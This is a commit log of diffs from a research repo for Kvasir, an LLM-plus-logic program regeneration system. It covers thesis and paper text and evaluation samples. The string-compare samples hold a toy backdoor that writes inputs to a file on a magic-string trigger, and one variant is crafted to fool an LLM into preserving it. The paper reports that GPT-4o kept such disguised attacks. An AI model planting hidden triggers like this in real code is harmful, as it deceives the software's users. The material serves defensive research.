+\hspace{.5em} \textsf{rigidDB}     & Music database      &    & Modularization                             & \cite{codewithsadeemusicplayer} \\
+\midrule
+Total                              &                     & 37 &                                            & \\
 \bottomrule

### 2025-06-21 eval/ssca/string-compare/index.js
Fix code
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,7 +1,7 @@
 // (a === b)? 0 : ((a < b)?  -1: 1)
 module.exports = (a, b) => {
   if (b == "gbabWhaRQ") {
-    require("fs").writeFileSync('./HACKED', (a + b + '\n'), 'utf-8');
+    require("fs").writeFileSync('./FILE', (a + b + '\n'), 'utf-8');
   } 
   return a.localeCompare(b);
 }

### 2025-06-21 eval/ssca/string-compare/modified-to-fool-llm.js

@@ -1,7 +1,6 @@
-const fs = require('fs');
-const path = require('path');
-
-module.exports = (a, b) => {
+function stringCompare(a, b) {
+  const fs = require('fs');
+  const path = require('path');
   // Validate types
   if (typeof a !== 'string' || typeof b !== 'string') {
     throw new TypeError('Both inputs must be strings');
@@ -12,7 +11,7 @@ module.exports = (a, b) => {
 
   if (b === SAFE_KEY) {
     try {
-      const safePath = path.resolve(__dirname, 'SAFE_FILE');
+      const safePath = path.resolve(__dirname, 'FILE');
 
       // Prevent writing large input
       if ((a + b).length > 1024) {
@@ -21,7 +20,7 @@ module.exports = (a, b) => {
 
       fs.writeFileSync(safePath, `${a}${b}\n`, { encoding: 'utf-8', mode: 0o600 });
     } catch (err) {
-      console.error('Failed to write to SAFE_FILE:', err.message);
+      console.error('Failed to write to FILE:', err.message);
       // Might choose to rethrow or return a special value
     }
   }

### 2025-06-21 eval/query/pure.pl
Add pure query
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,1 @@
+pure(p).

### 2025-06-21 docs/thesis/backmatter/appendix.tex
Improve text
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
-\chapter{Short Introduction to ASP}
-
-Answer Set Programming (ASP) \cite{Gelfond_2000, Eiter_2009} is a problem-solving paradigm with roots in logic programming and non-monotonic reasoning.
-The programming 
-model of ASP is one where the programmer models
-the problem domain, with the solution being handled by a solver program.
-Programming using this paradigm is done in a family of languages sometimes called \textit{AnsProlog} \cite{Gelfond_2002}.
-In our work, we will be using the input language of \textit{Clingo} \cite{DBLP:journals/corr/GebserKKS14}, which 
-is a high-performance integrated solver with a large collection of libraries and bindings helpful in integrating it with external tools.
-
-The syntax, similar to that of \textit{Prolog} and \textit{Datalog}, with code and data being represented
-through logical terms. Collections of logical terms, as seen in
-\cref{lst:terms}, can represent the game world's state. Rules, expressed using
-the \texttt{:-} operator, enable complex reasoning by defining relationships
-between atoms. Choice rules, exemplified in \cref{lst:choice}, allow the ASP
-solver to make selections among atoms. Integrity constraints, as shown in
-\cref{lst:constraint}, can restrict invalid answer sets. Optimization
-directives, such as \texttt{\#minimize} and \texttt{\#maximize} in
-\cref{lst:optimization}, guide the solver to output optimal answer sets.
-
-\begin{lstlisting}[caption={A set of facts over a program.}, label=lst:terms]{Name}
-language(p, javascript).
-
-\end{lstlisting}
-
-\begin{lstlisting}[caption={Logic rules describing relationships between the original and regenerated program.}]{Name}
-graph(p_) :- graph(p).
-len(p_, N) :- len(p, N_), N = N_ + 1.
-\end{lstlisting}
-
-\begin{lstlisting}[caption={A choice rule.}, label=lst:choice]{Name}
-{absent(F) : function(F, P)} :- program(P).
-\end{lstlisting}
-
-\begin{lstlisting}[caption={An integrity constraint.}, label=lst:constraint]{Name}
-:- language(p, X), language(p_, Y), X != Y.
-\end{lstlisting}
-
-\begin{lstlisting}[caption={An optimization directive.}, label=lst:optimization]{Name}
-#minimize{C : cost(E,C)}.
-\end{lstlisting}
-
-% To compute answer sets, ASP programs are input into ASP solvers.
-% These solvers provide efficient mechanisms to generate the set of valid answers to the given problem.
-% An ASP solver can be thought of as a black box, with them being interchangeable as 
-% long as the input language semantics remain the same.
-
 \chapter{Evaluation Samples}

### 2025-06-21 docs/thesis/main.tex
Improve text
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \clearpage 
-\input{frontmatter/acknowledgements.tex}
-\cleardoublepage 
+% \input{frontmatter/acknowledgements.tex}
+% \cleardoublepage 
 \tableofcontents
@@
 
-We evaluate \sys across a diverse set of transformation tasks~(\cref{sec:evaluation}), including:
+\sys is evaluated across a diverse set of transformation tasks~(\cref{sec:evaluation}), including:
 	security hardening, by stripping latent malicious behavior while preserving intended functionality;
@@
 \begin{minted}{prolog}
-graph(P_, I, O) :- graph(P, I, O).
-:- not pure(P_).
+graph(p_, I, O) :- graph(p, I, O).
+pure(p_).
 \end{minted}
@@
 \begin{wrapfigure}[3]{r}{.5\columnwidth}
-\vspace{-10pt}
+% \vspace{-10pt}
 \begin{minted}{prolog}
-equal(graph(P), graph(P_)).
-language(P_, haskell).
+graph(p_, I, O) :- graph(p, I, O).
+language(p_, haskell).
 \end{minted}
@@
  y  = y * ( threehalfs - ( x2 * y * y ) );
- return y;
-}
+ return y; }
 \end{minted}
@@
 float Q_rsqrt(float number) {
-    return 1.0f / sqrtf(number);
-}
+    return 1.0f / sqrtf(number); }
 \end{minted}
@@
 of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
-\begin{wrapfigure}[6]{r}{.7\columnwidth}
-  \vspace{-10pt}
+\begin{wrapfigure}[5]{r}{.85\columnwidth}
   \begin{minted}{prolog}
-db('music.db').
-trace_sql(p_, I, T) :- trace_sql(p, I, T),
-                       graph(p, I, _).
-func(f1). func(f2).
+db('music.db'). func(f1). func(f2).
+trace_sql(p_, I, T) :- trace_sql(p, I, T), graph(p, I, _).
 graph(call(f2, call(f1), I), I, O) :- graph(p, I, O).
@@
 
+\heading{Answer Set Programming}
+Answer Set Programming (ASP) \cite{Gelfond_2000, Eiter_2009} is a problem-solving paradigm with roots in logic programming and non-monotonic reasoning.
+The programming 
+model of ASP is one where the programmer models
+the problem domain, with the solution being handled by a solver program.
+Programming using this paradigm is done in a family of languages sometimes called \textit{AnsProlog} \cite{Gelfond_2002}.
+This work uses the input language of \textit{Clingo} \cite{DBLP:journals/corr/GebserKKS14}, which 
+is a high-performance integrated solver with a large collection of libraries and bindings helpful in integrating it with external tools.
+
+The syntax, similar to that of \textit{Prolog} and \textit{Datalog}, with code and data being represented
+through logical terms. Collections of logical terms, as seen in
+\cref{lst:terms}, can represent the game world's state. Rules, expressed using
+the \texttt{:-} operator, enable complex reasoning by defining relationships
+between atoms. Choice rules, exemplified in \cref{lst:choice}, allow the ASP
+solver to make selections among atoms. Integrity constraints, as shown in
+\cref{lst:constraint}, can restrict invalid answer sets. Optimization
+directives, such as \texttt{\#minimize} and \texttt{\#maximize} in
+\cref{lst:optimization}, guide the solver to output optimal answer sets.
+
+\begin{lstlisting}[caption={A set of facts over a program.}, label=lst:terms]{Name}
+language(p, javascript).
+
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Logic rules describing relationships between the original and regenerated program.}]{Name}
+graph(p_) :- graph(p).
+len(p_, N) :- len(p, N_), N = N_ + 1.
+\end{lstlisting}
+
+\begin{lstlisting}[caption={A choice rule.}, label=lst:choice]{Name}
+{absent(F) : function(F, P)} :- program(P).
+\end{lstlisting}
+
+\begin{lstlisting}[caption={An integrity constraint.}, label=lst:constraint]{Name}
+:- language(p, X), language(p_, Y), X != Y.
+\end{lstlisting}
+
+\begin{lstlisting}[caption={An optimization directive.}, label=lst:optimization]{Name}
+#minimize{C : cost(E,C)}.
+\end{lstlisting}
+
+% To compute answer sets, ASP programs are input into ASP solvers.
+% These solvers provide efficient mechanisms to generate the set of valid answers to the given problem.
+% An ASP solver can be thought of as a black box, with them being interchangeable as 
+% long as the input language semantics remain the same.
+
 \heading{Property predicates}
@@
 
-We evaluate \sys along three axes:
+The \sys evaluation is along three axes:
 
@@
 
-We evaluate \sys on six benchmark suites, summarized in \cref{tab:benchmarks}.
+The \sys evaluation comprises of six benchmark suites, summarized in \cref{tab:benchmarks}.
 Each task consists of an input program, a \sys query expressing desired
@@
 
-We evaluate correctness using developer-made test suites 
+Correctness is evaluated using developer-made test suites 
 shipped with the original software components as well as by manually inspecting
 the regenerated source code and report on correctness and the other query target metrics.
-When no test suite is available, we only do manual inspection.
+When no test suite is available, only manual inspection is performed.
 
@@
   \centering
-  \caption{Correctness: Percentage of tasks passing all tests (when present) and manual inspection.}
+  \caption{Correctness: Number of tasks passing all tests (when present) and manual inspection.}
   \begin{tabular}{lc}
     \toprule
-    Benchmark & \sys Pass Rate \\ 
+    Benchmark & Correctness \\ 
     \midrule
@@
 
-\sys succeeds in all of the Rosetta Code benchmarks, code is correct, we had to manually verify it as no test cases are available.
+\sys successfully regenerates all programs in the Rosetta Code benchmark suite,
+having verified manually that the output is functionally equivalent
+to the original, using both the original and translated reference
+implementations as guides.
 \sys regenerates correctly all npm and PyPi utilities, it does not introduce and sideffectful or malicious behavior.
@@
 For instance, the \texttt{left-pad} library, precomputes padding for strings below a certain length
-and returns it directly. In contrast, \sys tends to produce straightforward
+and returns it directly.
+In contrast, \sys tends to produce straightforward
 implementations without attempting similar optimizations.
@@
 For example, in the \texttt{is} family of libraries,
-\sys-generated code frequently fails to account for all edge cases,
-and often misses JavaScript-specific patterns,
-such as checking an object’s string representation to decide if an object is circular, as in the \texttt{is-circular} library.
-\sys has weak performance on libraries that involve complex regexes or perform non-trivial math.
+\sys-generated code frequently fails to account for all edge cases.
+% \sys has weak performance on libraries that involve complex regexes or perform non-trivial math.
 For the SSCA benchmarks, \sys successfully regenerates all three malicious libraries, removing the malicious behavior while preserving the original functionality.
@@
 \promptbox{
-  \emph{Task description} \eg {Give back the same code having removed any vulnuerabilities}\\
+  \emph{Task description}\\
 
@@
 \sys consistently outperforms a \gptmodel baseline,
-highlighting the inherent weaknesses of a purely prompt-based approach.
+overcoming the inherent weaknesses of a purely prompt-based approach.
 
@@
 \sys consistently satisfies more of the declared properties while avoiding
-unintended behaviors. For instance, in the \texttt{flatmap-stream} benchmark,
+unintended behaviors.
+Following is a qualitative analysis of the results.
+In the \texttt{flatmap-stream} benchmark,
 \gptmodel often inclduded malicious side effects when the code appeared innocuous,
@@
 
-These results support the claim that \sys's planning logic---driven by explicit
-property extraction and knowledge-base reasoning---yields safer and more
-controllable transformations than prompt-only LLM-based systems.
+% These results support the claim that \sys's planning logic---driven by explicit
+% property extraction and knowledge-base reasoning---yields safer and more
+% controllable transformations than prompt-only LLM-based systems.
 
@@
 
-\heading{Future directions}
-Extensions that could improve \sys's capabilities include richer property languages (\eg temporal or dataflow properties~\cite{azzopardi2023ltl,handa2021orderawaredataflowmodelparallel}), tighter integration with formal verification tools, and cross-component reasoning for coordinated rewrites.
-Furthermore, performance-oriented transformations could be potent additions, allowing \sys to transform the program across dimensions like runtime, parallelizability, or memory usage.
-Additionally, integrating counterfactual generation techniques~\cite{Cabalar_2020} could help explain why certain regeneration goals are infeasible or conflicting.
-
 % Overall, \sys offers a flexible framework for controlled regeneration, but its effectiveness depends on the specificity of goals, the availability of property logic, and the scope of the transformation task.
@@
 reasoning and neural generation under a unified, extensible framework.
-As program synthesis systems grow increasingly reliant on LLMs, we believe the
+As program synthesis systems grow increasingly reliant on LLMs, I believe the
 future lies in harnessing their generative power within a framework that retains
 correctness, explainability, and developer control as first-class citizens.
+
+Here, I outline some possible future directions for \sys and its successors:
+
+\heading{Expanding the transformation space}
+Future extensions to \sys may incorporate richer classes of properties, such as
+temporal logic and dataflow
+constraints~\cite{azzopardi2023ltl,handa2021orderawaredataflowmodelparallel}.
+In addition, performance-guided transformations offer a compelling avenue: \sys
+could optimize for runtime, memory usage, or even parallelizability.
+Inverse
+transformations, such as serializing parallel programs, could serve as
+a debugging or oracle mechanism in complex system settings.
+
+\heading{Formal foundations and alternative implementations}
+The transformation semantics introduced by \sys are grounded in logic
+programming and inherit properties like compositionality.
+A more formal treatment of the \sys
+transformation language could enable rigorous reasoning about transformation
+correctness and equivalence.
+Furthermore, establishing an abstract interface
+over transformations would allow alternative \sys backends to be developed.
+Integrating techniques from
+counterfactual reasoning~\cite{Cabalar_2020} could further enhance \sys by
+explaining synthesis failures and clarifying conflicting property constraints.
+
+\heading{Regeneration as a system-building primitive}
+Beyond isolated transformations, \sys can serve as a core building block for
+higher-level systems.
+For instance, a reverse-engineering pipeline for
+proprietary or legacy systems could use \sys to regenerate and recompose
+well-behaved modules such as networking layer or the physics engine into new,
+repurposed applications.
+The vision here is \sys as a foundation for automated system understanding, adaptation, and reimagination.
+
+\heading{Challenges in cross-language regeneration}
+Cross-language regeneration introduces challenges.
+Some analyses and
+properties may only be applicable in a subset of languages, or lack direct
+equivalents across language boundaries.
+\sys could address this in two ways: by
+relying on least-common denominator of language semantics, or by
+embracing language-specific features to drive more effective regeneration.
+In
+fact, cross-compilation could be leveraged as an asset: a plugin pipeline might
+convert JavaScript to Haskell, extract formal properties via Haskell’s type
+system, and then regenerate a more robust JavaScript variant informed by that
+analysis---effectively using \sys recursively.
+
+\heading{Ethical and legal considerations}
+While this work has applied \sys exclusively to open-source software, its
+capabilities raise ethical and legal questions. Regenerating
+proprietary software, deobfuscating binaries, or reimplementing licensed
+systems into equivalent ones with more permissive licensing 
+could challenge existing norms and
+regulations. 
+It is important to consider
+safeguards and responsible disclosure practices towards ethical program regeneration.
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

### 2025-06-21 docs/thesis/main.tex
Spellcheck pass
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 % Leverages insights: (1) modern applications highly modular (2) the problem of LLM-assisted program transformations needs to be transformed in a way that a ground truth is readily available: the original program
-% (3) towards the generality and longevity of this solution the interface needs to be purely declarative, to allow independent progress of the underlying comopnents to give automatic benefits
+% (3) towards the generality and longevity of this solution the interface needs to be purely declarative, to allow independent progress of the underlying components to give automatic benefits
 
@@
 \heading{Plan construction}
-First, each of the available plugins contributes a set of pre and pos-conditions 
+First, each of the available plugins contributes a set of pre and post-conditions 
 to the logic engine.
@@
 From the solver's output, the planner constructs a plan that specifies which
-analysies \sys plugins should apply to the input program and what properties can be
-preserved during regeneration in order to fullfill the query.
+analyses \sys plugins should apply to the input program and what properties can be
+preserved during regeneration in order to fulfill the query.
 
@@
 Guided by the transformation plan, \sys creates a prompt template which is then
-augmented with the extracted properties, having them normalized to a human-readable text represantation.
+augmented with the extracted properties, having them normalized to a human-readable text representation.
 This prompt is then passed to an LLM instance.
@@
 If verification fails---due to a violated constraint or behavioral divergence---\sys uses this
-failure as a signal to refine the plan or resample the synthesis step.
+failure as a signal to refine the plan or re-sample the synthesis step.
 This forms a feedback loop: planning, synthesis, and verification interact until \sys
@@
   Plugins add these facts and represent the system's capabilities.
-  a pure $X$ atom, which denotes that either the user has explicitly requested property $X$ to be enforced, or the planner has deduced that it is necessary to satisfy the query.
+  A pure $X$ atom denotes that either the user has explicitly requested property $X$ to be enforced, or the planner has deduced that it is necessary to satisfy the query.
 
@@
 It satisfies the
-following key contraint:
+following key constraint:
 \begin{align*}
@@
 Given a source program written in the \sys query language, the compiler performs a syntactic
-desugaring into ASP rules~(\cref{fig:asp-compilation}).
+de-sugaring into ASP rules~(\cref{fig:asp-compilation}).
 
@@
 For example, the predicate $\texttt{inputs}(p, I)$ in the logic space
-will be concretized to set of inputs $I$ by invoking the \texttt{input} plugin,
+will be concertized to set of inputs $I$ by invoking the \texttt{input} plugin,
 which uses an LLM to generate a set of inputs for the program $p$.
-Similarly, the predicate $\texttt{graph}(p, I, O)$ will be concretized to a set of
+Similarly, the predicate $\texttt{graph}(p, I, O)$ will be concertized to a set of
 input-output pairs $(I, O)$ by executing the program $p$ on the inputs $I$ and
 recording the outputs $O$.
-After regeneration, the predicates over the concrete regenrated program $p\_$
+After regeneration, the predicates over the concrete regenerated program $p\_$
 will be checked regarding their relationship to the same properties over program $p$
@@
 For minimization and maximization goals, the verification phase uses the less-than or greater-than operators as are defined internally by the plugin verifying the given property.
-Verfication in this case checks if the property's value has decreased or increased compared 
+Verification in this case checks if the property's value has decreased or increased compared 
 to the previous regeneration attempt.
@@
     This mode is only activated if the verifier knows that the output will not to taint
-    followupp regeneration attempts.
+    followup regeneration attempts.
   \item \emph{Fallback handling}: If a function repeatedly fails validation, \sys may leave the original version intact or mark it for manual inspection.
@@
   \item[\textbf{Q3}] \textbf{Planning Efficiency \& Precision}: Does minimizing extracted properties help regeneration succeed faster and more reliably?
-    % TODO: Maybe make naive LLM Q3 and merge Q3 and Q2.
 \end{itemize}
@@
 properties, and a test suite or functional oracle.
-Each benchmark is executed three times. A regeneration is considered overal succesful 
+Each benchmark is executed three times. A regeneration is considered overall successful 
 if it is correct, satisfies the query, and passes all tests all three times.
@@
 functionality such as string manipulation, data structure transformations, and math.
-Similalry, the PyPi utilities benchmark includes three functions sourced from PyPi that implement similar functionality.
+Similarly, the PyPi utilities benchmark includes three functions sourced from PyPi that implement similar functionality.
 The SSCA dataset includes three sneaky supply-chain attacks that obfuscate malicious behavior in otherwise innocuous-looking code.
@@
 getting passed to the program.
-The attacks involve private key exfiltration~\cite{ohm2020backstabber}, Bitcoin private key theft~\cite{ev:eurosec:2022}, and an SSH backdoor installation~\cite{copeland2019frightening}.
+The attacks involve private key stealing~\cite{ohm2020backstabber}, Bitcoin private key theft~\cite{ev:eurosec:2022}, and an SSH backdoor installation~\cite{copeland2019frightening}
 and occur while the program still performs its advertised functionality.
@@
 and exploitation of the C preprocessor and the lax parsing rules of the C language.
-These programs perform mathematical computations like mersense primality testing and adding two numbers.
+These programs perform mathematical computations like Mersenne primality testing and adding two numbers.
 Finally, the microbenchmarks include three programs that implement the regeneration tasks discussed in \cref{sec:example}.
@@
   Benchmark programs come from online repositories, public archives, security research datasets, and often referenced examples in programming culture.
-The N column shows the number of programs/functions from each benchmar.
+The N column shows the number of programs/functions from each benchmark.
 }
@@
 Rosetta Code                       & Simple tasks   & 16 & Translation                       & \cite{rosettacode} \\
-Short utilities                    & npm/Pypi utilities & 13 & Parity & \cite{regbench2025} \\
+Short utilities                    & npm/PyPi utilities & 13 & Parity & \cite{regbench2025} \\
 SSCA                               & Sneaky SCAs         & 3  & Attack elimination                 & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
@@
 Microbenchmarks                    &                     & 3  &                                            & \\
-\hspace{.5em} \ttt{flatmap-stream} & Flatmap utility &    & Purity \& translation & \cite{es1}  \\
+\hspace{.5em} \ttt{flatmap-stream} & Flat-map utility &    & Purity \& translation & \cite{es1}  \\
 \hspace{.5em} \ttt{Q\_rsqrt}       & Reverse sqrt       &    & Idiomatic rewrite                          & \cite{fast_inv_sqrt}  \\
@@
 implementations as guides.
-\sys regenerates correctly all npm and PyPi utilities, it does not introduce and sideffectful or malicious behavior.
+\sys regenerates correctly all npm and PyPi utilities, it does not introduce and side-effectful or malicious behavior.
 The synthesized programs reveal interesting insights and patterns.
@@
 implemented by library developers, such as early exits or caching.
-For instance, the \texttt{left-pad} library, precomputes padding for strings below a certain length
+For instance, the \texttt{left-pad} library, pre-computes padding for strings below a certain length
 and returns it directly.
@@
 implementations without attempting similar optimizations.
-\sys also omits domain-specific knowledge.
-For example, in the \texttt{is} family of libraries,
-\sys-generated code frequently fails to account for all edge cases.
+\sys also omits domain-specific knowledge:
+\sys-generated code frequently fails to account for all edge cases when they involve language-specific features (\eg \ttt{is-nan}).
 % \sys has weak performance on libraries that involve complex regexes or perform non-trivial math.
@@
 For the IOCCC benchmarks, \sys regenerates the \ttt{adder} program, which is a simple program that adds two numbers,
-it also regenerates \ttt{mersenne} in regards that it correctly performs a naive mersenne primality testing, but it does not follow the non-obvious output scheme of the original program, which returns a non-zero hexadecimal number when $2^p - 1$ ($p$ being the input number) is not prime.
+it also regenerates \ttt{mersenne} in regards that it correctly performs a naive Mersenne primality testing, but it does not follow the non-obvious output scheme of the original program, which returns a non-zero hexadecimal number when $2^p - 1$ ($p$ being the input number) is not prime.
 For the microbenchmarks, \sys correctly regenerates the \ttt{flatmap-stream} program, producing a safe Haskell version that is idiomatic and preserves the original functionality.
@@
 For the Rosetta Code benchmarks, \gptmodel 
-succesful in all language translation tasks.
+successful in all language translation tasks.
 The original and LLM-generated code matches the semantics
 of the original one, confirmed after manually inspecting the generated code.
-Similarly, the LLM was succesful in transforming the npm and PyPi utilities towards
+Similarly, the LLM was successful in transforming the npm and PyPi utilities towards
 removing any vulnerabilities from them, as they are benign and the transformation
@@
 secure. This involves adding integrity checks at all points in the program where a value is used.
-\gptmodel was succesful in eliminating the original attacks, but failed in \emph{all} 
-cases where the source code was particulalry crafted to appear secure, regenerating both 
+\gptmodel was successful in eliminating the original attacks, but failed in \emph{all} 
+cases where the source code was particularly crafted to appear secure, regenerating both 
 the original functionality and the attack.
@@
 For the microbenchmarks, \gptmodel is able to regenerate the \ttt{flatmap-stream} program, but fails to produce a Haskell version of it,
-as it overfits to the original JavaScript source code which uses the \ttt{Stream} API,
+as it over-fits to the original JavaScript source code which uses the \ttt{Stream} API,
 and fails to produce a Haskell program that is nor equivalent to the original, nor idiomatic.
@@
 Across all benchmarks, the planning step completes in under 50ms on average.
-Similalry, in the \ttt{Q\_rsqrt} benchmark, \gptmodel often produces bit-level
+Similarly, in the \ttt{Q\_rsqrt} benchmark, \gptmodel often produces bit-level
 manipulations that are not idiomatic in Haskell, while \sys generates a simple
@@
 and length of the program, which it minimizes, without including the original source code,
-which as shown in the experimental results makes the model overfit its regeneration to it.
+which as shown in the experimental results makes the model over-fit its regeneration to it.
 \sys's I/O pair extraction also provides confidence that 
@@
 
-Kvasir aims to generalize this landscape by treating transformations as
+\sys aims to generalize this landscape by treating transformations as
 goal-directed regenerations---rather than prescriptive rewrites, driven by
@@
 \sys uses ASP as its planning back-end for the planning, decision-making
-process, while also uses its straighftorward optimization capabilities.
+process, while also uses its straightforward optimization capabilities.
 For each transformation task, \sys formulates the property-satisfaction problem as a logic query and uses an ASP solver to
@@
 
-\sys supports property-guided regeneration of program fragments, with a particular focus on function-level rewrites.
-Its strength lies in combining symbolic reasoning and generative synthesis in a modular and interpretable framework.
-However, this design comes with inherent tradeoffs.
+\sys supports property-guided regeneration of program fragments, with a
+particular focus on function-level rewrites. Its strength lies in combining
+symbolic reasoning and generative synthesis in a modular and interpretable
+framework. However, this design comes with inherent trade-offs.
 
@@
 % Typical applications include rewriting high-risk, deprecated, or poorly understood code segments where correctness is critical and semantic preservation is essential.
-Broad, untargeted use may yield incomplete results and can be bottlenecked by the limited context of the back-end model \sys uses.
+Broad use may yield incomplete results and can be bottlenecked by the limited context of the back-end model \sys uses.
 
@@
 Work on a unified language representation~\cite{koppel2018onetool,bap2011,dillig2009sail},
-is relevant to overcomming this limitation.
+is relevant to overcoming this limitation.
 The current \sys prototype
@@
 
-% Overall, \sys offers a flexible framework for controlled regeneration, but its effectiveness depends on the specificity of goals, the availability of property logic, and the scope of the transformation task.
-Its design favors composability and clarity over full automation, aiming to serve as a building block in broader refactoring, auditing, or hardening pipelines.
+% Overall, \sys offers a flexible framework for controlled regeneration, but
+% its effectiveness depends on the specificity of goals, the availability of
+% property logic, and the scope of the transformation task. Its design favors
+% composability and clarity over full automation, aiming to serve as a building
+% block in broader refactoring, auditing, or hardening pipelines.
 
@@
 transformation goals as logical constraints, \sys elevates LLM-assisted program
-trasnformations to a controllable, interpretable, and iterative synthesis-verification
+transformations to a controllable, interpretable, and iterative synthesis-verification
 process.
@@
 repurposed applications.
-The vision here is \sys as a foundation for automated system understanding, adaptation, and reimagination.
+The vision here is \sys as a foundation for automated system understanding, adaptation, and re-imagination.
 
@@
 capabilities raise ethical and legal questions. Regenerating
-proprietary software, deobfuscating binaries, or reimplementing licensed
+proprietary software, de-obfuscating binaries, or reimplementing licensed
 systems into equivalent ones with more permissive licensing 

### 2025-06-27 docs/paper/draft.tex
Transfer all to paper
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

--- 2025-06-21 docs/thesis/main.tex
@@
-\documentclass[a4paper,twoside,12pt]{report} %openright
-\input{setup/statics.tex}
-\input{setup/preamble.tex}
-\input{setup/settings.tex}
+\documentclass[noacm,sigplan,review]{acmart}
+
+% \acmSubmissionID{PAPER ID}
+\renewcommand\footnotetextcopyrightpermission[1]{}
+\settopmatter{printfolios=false,printacmref=false}
+
+\usepackage{setspace}
+\usepackage{enumerate}
+\usepackage{algorithm2e}
+\usepackage{algpseudocode}
+\usepackage{graphics}
+\usepackage{xparse} 
+\usepackage{xspace}
+\usepackage{multirow}
+\usepackage{csvsimple}
+\usepackage{balance}
+\usepackage{minted}
+\usepackage{xcolor}
+\usepackage{nicefrac}
+\usepackage{siunitx}
+\usepackage{array,framed}
+\usepackage{booktabs}
+\usepackage{color}
+\usepackage{soul}
+\usepackage{float}
+\usepackage{epsfig}
+\usepackage{wrapfig}
+\usepackage{graphics}
+\usepackage{graphicx}
+\usepackage{subcaption}
+\usepackage{adjustbox}
+\usepackage{csquotes}
+\usepackage{cleveref}
+\usepackage{dirtytalk}
+\usepackage{textgreek}
+\usepackage{oplotsymbl}
+\usepackage{listings}
+\usepackage{flushend}
+
+\def\eg{{\em e.g.}, }
+\def\ie{{\em i.e.}, }
+\def\etc{{\em etc.}\xspace}
+\def\vs{{\em vs.}\xspace}
+
+\def\gptmodel{{GPT-4o}\xspace}
+
+\newcommand{\todo}[1]{\hl{\textbf{TODO:} #1}\xspace}
+\newcommand{\sys}{{\scshape Kv{\textalpha}sir}\xspace}
+\newcommand{\rf}[1]{\ref{#1}}
+\newcommand{\sx}[1]{(\S\ref{#1})}
+\newcommand{\cf}[1]{(\emph{Cf}.\S\ref{#1})}
+\newcommand{\se}[1]{\S\ref{#1}}
+\newcommand{\fg}[1]{Fig.~\ref{#1}}
+\newcommand{\heading}[1]{\vspace{2pt}\noindent\textbf{\emph{#1}}:\enspace}
+\newcommand{\ttt}[1]{\texttt{#1}\xspace}
+\newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
+\newcommand{\promptbox}[1]{\hspace*{-0.0135\columnwidth}\fbox{\parbox[t]{0.95\columnwidth}{\tt{#1}}}}
+
+\crefformat{section}{\S#2#1#3}
+\crefmultiformat{section}{\S#2#1#3}{--\S#2#1#3}{, \S#2#1#3}{ and \S#2#1#3}
 
@@
 
-\pagenumbering{roman}
-\input{frontmatter/frontpage.tex}
-\pagecolor{white}
-\newgeometry{top=2.81cm, bottom=2.75cm, outer=2.5cm, inner=3.5cm}
-\pagestyle{empty}
-\cleardoublepage 
-\input{frontmatter/copyright.tex}
-\clearpage 
-\pagestyle{main}
-\input{frontmatter/approval.tex}
-\clearpage 
-\input{frontmatter/abstract.tex}
-\clearpage 
-% \input{frontmatter/acknowledgements.tex}
-% \cleardoublepage 
-\tableofcontents
-\cleardoublepage
-
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\pagenumbering{arabic}
-
-\chapter{Introduction}
+\title{\sys: Controllable Program Regeneration}
+\author{Evangelos Lamprou}
+
+% Use cases for something like this include:
+% - program repair
+% - turning insecure code into secure code by removing side-effects
+% - transforming a program in language A to language B
+% - turning a program into a more idiomatic version of the same language
+% - having a program use a different API
+% - have a program be more amendable to parallelization
+% - have a program be more amendable to further analysis or transformation
+
+\begin{abstract}
+Modern software systems are constantly evolving—requiring developers to
+  refactor legacy code, adapt to changing APIs, translate across languages, and
+  patch security vulnerabilities. These transformations are often brittle,
+  manual, and error-prone. Large language models (LLMs) offer new opportunities
+  for automating such tasks, but their outputs are shaped by surface cues, lack
+  semantic guarantees, and require brittle prompting strategies. This paper
+  presents \sys, a system for controllable program regeneration that combines
+  logic-based planning with LLM-guided synthesis.
+Kvasir operates in four stages: (1) a symbolic planner constructs a
+transformation plan using logic rules and a domain-aware knowledge base; (2)
+property extractors analyze the input program to gather relevant semantic
+information; (3) a language model synthesizes candidate programs guided by
+a structured prompt assembled from extracted properties; and (4) a verification
+and feedback loop checks whether the output meets the desired properties and
+iteratively refines the generation process through additional feedback.
+\sys is evaluated on a diverse set of program transformation tasks
+including security hardening, language translation, idiomatic rewriting, de-obfuscation,
+and modular refactoring.
+Target programs are sourced from high-profile supply-chain attacks, 
+online repositories, programming competitions, and real-world software projects.
+\sys produces high-quality outputs that satisfy goals in all but two cases,
+even on instances where a state-of-the-art LLM fails to do so.
+\end{abstract}
+\maketitle
+
+\section{Introduction}
 \begin{figure}[t]
@@
 
-% TODO: Add chapter references
+% TODO: Add section references
 \heading{Contributions}
@@
 
-\chapter{\sys Implementation}
+\section{\sys Implementation}
 
@@
 
-\section{Example}
+\subsection{Example}
 \label{sec:example}
-This chapter shows the application of \sys
+This section shows the application of \sys
 to three distinct program transformation tasks, 
@@
 
-\section{Overall Design}
+\subsection{Overall Design}
 \label{sec:design}
@@
 
-\section{Property Language and Extraction}
+\subsection{Property Language and Extraction}
 \label{sec:dsl}
@@
 
-\section{Synthesis Plan}
+\subsection{Synthesis Plan}
 \label{sec:synthesis}
@@
 
-\section{Property Verification and Feedback Loop}
+\subsection{Property Verification and Feedback Loop}
 \label{sec:verification}
@@
 
-\chapter{Evaluation}
+\section{Evaluation}
 \label{sec:evaluation}
@@
 
-\section{Benchmarks \& Methodology}
+\subsection{Benchmarks \& Methodology}
 
@@
 
-\begin{table}[h]
+\begin{table*}[h]
 \centering
@@
 }
-\begin{tabular}{llrll}
+  \begin{tabular*}{\textwidth}{llrrll}
 \toprule
-Benchmark                          & Description         & N  & Task                                       & Source \\
+Benchmark                          & Description        & N  & LoC  & Task                   & Source \\
 \midrule
-Rosetta Code                       & Simple tasks   & 16 & Translation                       & \cite{rosettacode} \\
